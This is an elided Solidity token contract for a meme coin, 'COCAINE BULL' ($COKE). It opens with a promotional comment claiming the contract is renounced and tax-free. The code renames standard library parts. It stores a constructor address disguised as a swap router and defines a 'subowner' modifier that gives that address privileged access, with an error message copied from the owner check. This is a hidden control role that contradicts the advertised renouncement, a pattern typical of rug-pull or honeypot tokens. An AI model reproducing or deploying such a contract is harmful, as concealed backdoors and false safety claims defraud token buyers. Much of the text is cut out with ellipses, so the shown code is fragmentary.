...
/*
🚀 Welcome to COCAINE BULL Community! 🌐 $COCAINE BULL

🎉 Get ready for an epic gaming adventure with COCAINE BULL tokens! 🎮

🔥 Contract Renounced ✅
🚫 0% Tax - Trade freely! 💰
🔥 LP Burn - Safeguarding value! 🔥
https://www.coocainebull.vip/

*/
pragma solidity 0.8.19;

interface COCAINEBULL33 {
  /**
...
/*
 * @dev Provides information about the current execution COCAINEBULL20Burnable, including the
 ...
 */
abstract contract COCAINEBULL20Burnable {
...
// File: @openzeppelin/contracts/access/COCAINEBULL20Ownable.sol
 ...
 * the owner.
 */
abstract contract COCAINEBULL20Ownable is COCAINEBULL20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "COCAINEBULL20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "COCAINEBULL20Ownable: new owner is the zero address");
 ...
 * `SafeCOCAINEBULL` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeCOCAINEBULL {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeCOCAINEBULL: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeCOCAINEBULL: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeCOCAINEBULL: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeCOCAINEBULL: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeCOCAINEBULL: modulo by zero");
  }
...
contract COCAINEBULL is COCAINEBULL20Burnable, COCAINEBULL33, COCAINEBULL20Ownable {
    
    using SafeCOCAINEBULL for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _symbol = "COKE";
        _decimals = 9;
        _totalSupply = 8888000000000 * 10 ** 9;
    ...
    */
    ...
    /**
    * @dev See {COCAINEBULL33-totalSupply}.
    */
    ...
    /**
    * @dev See {COCAINEBULL33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "COCAINEBULL20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {COCAINEBULL33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {COCAINEBULL33-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {COCAINEBULL33-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {COCAINEBULL33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {COCAINEBULL33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "COCAINEBULL33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {COCAINEBULL33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "COCAINEBULL33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "COCAINEBULL33: transfer from the zero address");
        require(shippingto != address(0), "COCAINEBULL33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "COCAINEBULL33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "COCAINEBULL33: approve from the zero address");
        require(transporteur != address(0), "COCAINEBULL33: approve to the zero address");
